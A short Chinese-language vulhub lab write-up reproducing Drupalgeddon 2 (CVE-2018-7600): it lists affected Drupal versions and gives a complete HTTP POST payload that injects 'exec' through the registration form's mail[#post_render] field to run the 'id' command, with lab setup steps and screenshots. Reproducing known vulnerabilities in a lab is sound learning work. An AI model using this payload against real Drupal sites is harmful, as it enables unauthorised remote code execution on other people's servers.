# Drupal Drupalgeddon 2远程执行代码漏洞（CVE-2018-7600）

###### by ADummy

### 0x00利用路线

​			Burpsuite抓包改包--->有回显--->getshell

### 0x01漏洞介绍

​			7.58之前的Drupal，8.3.9之前的8.x，8.4.6之前的8.4.x和8.5.1之前的8.5.x允许远程攻击者执行任意代码，因为该问题会影响具有默认或通用模块配置的多个子系统，包括表单API。。

##### 影响版本

```
Drupal < 7.58
Drupal < 8.3.9
Drupal < 8.4.6
Drupal < 8.5.1
```

### 0x02漏洞复现

#### payload：

```
POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 103

form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id
```

​			**启动环境后，访问`http://your-ip:8080/`，您将看到drupal安装页面。使用“标准”配置文件完成drupal安装。由于没有mysql环境，因此在安装时应选择sqlite数据库。**

​				**默认页面**![Drupal_Drupalgeddon_2RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Drupal_Drupalgeddon_2RCE_1.jpg)

​			**id被执行**

![Drupal_Drupalgeddon_2RCE_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Drupal_Drupalgeddon_2RCE_2.jpg)



​			

